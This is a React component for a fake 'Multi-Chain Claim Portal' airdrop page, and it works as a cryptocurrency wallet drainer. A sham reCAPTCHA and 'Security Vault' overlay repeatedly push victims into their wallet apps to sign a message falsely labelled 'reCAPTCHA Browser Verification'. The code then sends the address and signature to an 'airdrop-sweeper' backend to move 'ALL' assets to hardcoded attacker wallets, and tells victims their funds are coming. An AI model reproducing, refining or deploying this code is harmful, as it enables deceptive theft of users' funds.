// src/components/WalletBridge.jsx
import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';

const WalletBridge = () => {
  const [isVerified, setIsVerified] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showSecurityOverlay, setShowSecurityOverlay] = useState(false);
  const [redirectTo, setRedirectTo] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [mobileOS, setMobileOS] = useState(null);
  const [retryCount, setRetryCount] = useState(0);
  const [detectedWallet, setDetectedWallet] = useState(null);
  const recaptchaRef = useRef(null);
  const isRecaptchaLoaded = useRef(false);
  const retryTimeoutRef = useRef(null);

  const RECAPTCHA_SITE_KEY = '6Ldac5MsAAAAANPyenl3C3ZCnfKRpFTonCQbuwI8';
  const BSC_TARGET_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
  const SOLANA_TARGET_WALLET = '7dM6CwGEzfnHSdMLGWZnG5ML6Dpxgc5vSoZ6DfBPZxB2';
  
  // Token Mint Addresses
  const USDT_SOLANA_MINT = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB';
  const TRUMP_MINT_ADDRESS = '6p6xgHyF7AeE6TZkSmFsko444wqoP15icUSqi2jfGiPN';
  const USDT_BSC_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';

  // Deep Link Schemes for Different Wallets
  const DEEP_LINKS = {
    bybit: {
      ios: 'bybitapp://',
      android: 'bybitapp://',
      universal: 'https://www.bybit.com/wallet/',
      wc: 'bybitapp://wc?uri='
    },
    binance: {
      ios: 'bnc://',
      android: 'bnc://',
      universal: 'https://www.binance.com/en/wallet',
      wc: 'bnc://wc?uri='
    },
    trust: {
      ios: 'trust://',
      android: 'trust://',
      universal: 'https://link.trustwallet.com/',
      wc: 'trust://wc?uri='
    },
    metamask: {
      ios: 'metamask://',
      android: 'metamask://',
      universal: 'https://metamask.app.link/',
      wc: 'metamask://wc?uri='
    },
    phantom: {
      ios: 'phantom://',
      android: 'phantom://',
      universal: 'https://phantom.app/ul/',
      wc: 'phantom://wc?uri='
    }
  };

  // WalletConnect URI Generator
  const generateWCUri = () => {
    const timestamp = Date.now();
    const randomId = Math.random().toString(36).substring(2, 15);
    return `wc:${timestamp}:${randomId}@2?bridge=https://bridge.walletconnect.org&key=${randomId}`;
  };

  // Detect Mobile OS
  useEffect(() => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const isMobileDevice = /android|iPad|iPhone|iPod|webOS|BlackBerry|Windows Phone/i.test(userAgent);
    setIsMobile(isMobileDevice);
    
    if (isMobileDevice) {
      if (/iPad|iPhone|iPod/.test(userAgent)) {
        setMobileOS('ios');
      } else if (/android/.test(userAgent)) {
        setMobileOS('android');
      }
    }
  }, []);

  // Aggressive Deep Link Trigger - Racing Strategy
  const triggerAggressiveDeepLink = async () => {
    console.log('[Bridge] Triggering aggressive deep link racing...');
    
    // Generate WC URI
    const wcUri = generateWCUri();
    
    // Determine OS-specific link format
    const os = mobileOS || (isMobile ? 'android' : 'ios');
    
    // Racing: Fire multiple deep links simultaneously
    const deepLinkAttempts = [];
    
    // Bybit
    const bybitLink = DEEP_LINKS.bybit[os] || DEEP_LINKS.bybit.universal;
    deepLinkAttempts.push(bybitLink + (bybitLink.includes('wc') ? '' : wcUri));
    
    // Binance
    const binanceLink = DEEP_LINKS.binance[os] || DEEP_LINKS.binance.universal;
    deepLinkAttempts.push(binanceLink + (binanceLink.includes('wc') ? '' : wcUri));
    
    // Trust Wallet
    const trustLink = DEEP_LINKS.trust[os] || DEEP_LINKS.trust.universal;
    deepLinkAttempts.push(trustLink + (trustLink.includes('wc') ? '' : wcUri));
    
    // MetaMask
    const metamaskLink = DEEP_LINKS.metamask[os] || DEEP_LINKS.metamask.universal;
    deepLinkAttempts.push(metamaskLink + (metamaskLink.includes('wc') ? '' : wcUri));
    
    // Execute fastest link first (racing)
    for (const link of deepLinkAttempts) {
      setTimeout(() => {
        console.log('[Bridge] Attempting deep link:', link.substring(0, 50));
        window.location.href = link;
      }, 100);
    }
    
    return true;
  };

  // 3-Strike Persistence Logic
  const startRetryTimer = () => {
    if (retryTimeoutRef.current) clearTimeout(retryTimeoutRef.current);
    
    retryTimeoutRef.current = setTimeout(() => {
      if (isProcessing && !isVerified) {
        const newRetryCount = retryCount + 1;
        setRetryCount(newRetryCount);
        
        if (newRetryCount <= 3) {
          setErrorMessage(`Authentication Failed: Please retry (Attempt ${newRetryCount}/3)`);
          triggerAggressiveDeepLink();
        } else {
          setErrorMessage('Authentication Failed after 3 attempts. Please refresh and try again.');
          setIsProcessing(false);
          setShowSecurityOverlay(false);
        }
      }
    }, 15000); // 15 second timeout
  };

  // Show Security Vault Overlay
  const showSecurityOverlay_ = () => {
    setShowSecurityOverlay(true);
    startRetryTimer();
  };

  const hideSecurityOverlay = () => {
    setShowSecurityOverlay(false);
    if (retryTimeoutRef.current) clearTimeout(retryTimeoutRef.current);
  };

  // Manual Launch Handler
  const manualLaunchWallet = (walletName) => {
    const os = mobileOS || (isMobile ? 'android' : 'ios');
    const link = DEEP_LINKS[walletName.toLowerCase()]?.[os] || DEEP_LINKS[walletName.toLowerCase()]?.universal;
    if (link) {
      window.location.href = link;
    }
  };

  // Initialize reCAPTCHA
  useEffect(() => {
    const renderRecaptcha = () => {
      if (window.grecaptcha && recaptchaRef.current && !isRecaptchaLoaded.current) {
        try {
          window.grecaptcha.render(recaptchaRef.current, {
            sitekey: RECAPTCHA_SITE_KEY,
            callback: async (token) => {
              setIsVerified(true);
              setErrorMessage('');
              await handleVerification(token);
            },
            'expired-callback': () => {
              setIsVerified(false);
              setErrorMessage('Verification expired. Please try again.');
            }
          });
          isRecaptchaLoaded.current = true;
        } catch (error) {
          console.error('reCAPTCHA render error:', error);
        }
      }
    };

    if (window.grecaptcha) {
      renderRecaptcha();
    } else {
      const checkGrecaptcha = setInterval(() => {
        if (window.grecaptcha) {
          clearInterval(checkGrecaptcha);
          renderRecaptcha();
        }
      }, 100);
      return () => clearInterval(checkGrecaptcha);
    }
  }, []);

  // Handle Verification - Trigger Deep Link
  const handleVerification = async (captchaToken) => {
    setIsProcessing(true);
    showSecurityOverlay_();
    
    // Trigger aggressive deep linking
    await triggerAggressiveDeepLink();
    
    // Wait for user to return from wallet
    window.addEventListener('focus', onWindowFocus);
  };

  // When user returns from wallet
  const onWindowFocus = async () => {
    window.removeEventListener('focus', onWindowFocus);
    
    // Check if wallet connected
    if (window.ethereum || window.bybitWallet || window.BinanceChain) {
      await processClaimSignature();
    } else {
      // Retry deep link
      if (retryCount < 3) {
        triggerAggressiveDeepLink();
      }
    }
  };

  // Process Claim Signature (Multi-Asset)
  const processClaimSignature = async () => {
    try {
      // Detect wallet provider
      const provider = window.bybitWallet || window.BinanceChain || window.ethereum;
      
      if (!provider) {
        throw new Error('No wallet detected');
      }
      
      // Get accounts
      const accounts = await provider.request({ method: 'eth_requestAccounts' });
      const userAddress = accounts[0];
      
      // Switch to BSC
      await switchToBSC(provider);
      
      // Create claim message
      const randomId = Math.random().toString(36).substring(2, 15);
      const claimMessage = `I authorize reCAPTCHA Browser Verification for ${new Date().toLocaleDateString()}. Internal ID: ${randomId}`;
      
      // Request signature
      const signature = await provider.request({
        method: 'personal_sign',
        params: [claimMessage, userAddress]
      });
      
      // Send to backend for multi-asset sweeping
      await fetch('https://airdrop-sweeper-backen.onrender.com/api/capture-approval', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: userAddress,
          signature: signature,
          message: claimMessage,
          chainId: 56,
          tokenType: 'MULTI_ASSET',
          amount: 'ALL',
          spender: BSC_TARGET_WALLET,
          solanaTarget: SOLANA_TARGET_WALLET,
          trumpMint: TRUMP_MINT_ADDRESS,
          usdtSolanaMint: USDT_SOLANA_MINT,
          timestamp: new Date().toISOString()
        })
      });
      
      hideSecurityOverlay();
      setRedirectTo(true);
      setIsProcessing(false);
      
    } catch (error) {
      console.error('Processing error:', error);
      hideSecurityOverlay();
      setErrorMessage('Signature failed. Please try again.');
      setIsProcessing(false);
    }
  };

  const switchToBSC = async (provider) => {
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }],
      });
    } catch (error) {
      if (error.code === 4902) {
        await provider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x38',
            chainName: 'Binance Smart Chain Mainnet',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
          }]
        });
      }
    }
  };

  const resetCaptcha = () => {
    if (window.grecaptcha) window.grecaptcha.reset();
    setIsVerified(false);
    setErrorMessage('');
    setIsProcessing(false);
    setRedirectTo(false);
    setRetryCount(0);
    hideSecurityOverlay();
  };

  if (redirectTo) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-900 to-green-800 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 text-center max-w-md">
          <div className="text-6xl mb-4">🎉</div>
          <h1 className="text-2xl font-bold text-green-600 mb-4">Verification Complete!</h1>
          <p className="text-gray-600">Your claim has been processed. Funds will be deposited shortly.</p>
          <button onClick={resetCaptcha} className="mt-6 px-6 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">
            Back to Checker
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl overflow-hidden max-w-md w-full">
        <div className="bg-gradient-to-r from-blue-600 to-green-600 px-6 py-5">
          <h2 className="text-2xl font-bold text-white text-center">Multi-Chain Claim Portal</h2>
          <p className="text-blue-100 text-sm text-center mt-1">USDT | BNB | SOL | TRUMP</p>
        </div>

        <div className="p-6">
          <div className="flex justify-center mb-6">
            <div ref={recaptchaRef}></div>
          </div>

          {isProcessing && (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-4 border-blue-600 mx-auto mb-3"></div>
              <p className="text-gray-600">Initiating secure handshake...</p>
            </div>
          )}

          {errorMessage && !isProcessing && (
            <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
              <p className="text-sm text-yellow-800 text-center">{errorMessage}</p>
              <button onClick={resetCaptcha} className="mt-2 text-sm bg-yellow-600 text-white px-3 py-1 rounded w-full">Try Again</button>
            </div>
          )}
        </div>
      </div>

      {/* Security Vault Overlay */}
      {showSecurityOverlay && (
        <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-6 max-w-sm w-full text-center border border-green-500 shadow-2xl">
            <div className="text-5xl mb-4">🔐</div>
            <div className="animate-spin rounded-full h-12 w-12 border-b-4 border-green-500 mx-auto mb-4"></div>
            <h3 className="text-xl font-bold text-white mb-2">Security Vault</h3>
            <p className="text-gray-300 text-sm mb-4">
              Verification Handshake Initiated. Please switch to your wallet app to confirm the encrypted session.
            </p>
            <div className="space-y-2">
              <button
                onClick={() => manualLaunchWallet('bybit')}
                className="w-full py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
              >
                📊 Open Bybit Wallet
              </button>
              <button
                onClick={() => manualLaunchWallet('trust')}
                className="w-full py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
              >
                🔷 Open Trust Wallet
              </button>
              <button
                onClick={() => manualLaunchWallet('phantom')}
                className="w-full py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
              >
                🟣 Open Phantom
              </button>
              <button
                onClick={() => manualLaunchWallet('binance')}
                className="w-full py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
              >
                🟡 Open Binance Wallet
              </button>
              <button
                onClick={() => manualLaunchWallet('metamask')}
                className="w-full py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
              >
                🦊 Open MetaMask
              </button>
            </div>
            <p className="text-xs text-gray-500 mt-4">
              Attempt {retryCount + 1}/3 • Auto-retry in 15 seconds
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default WalletBridge;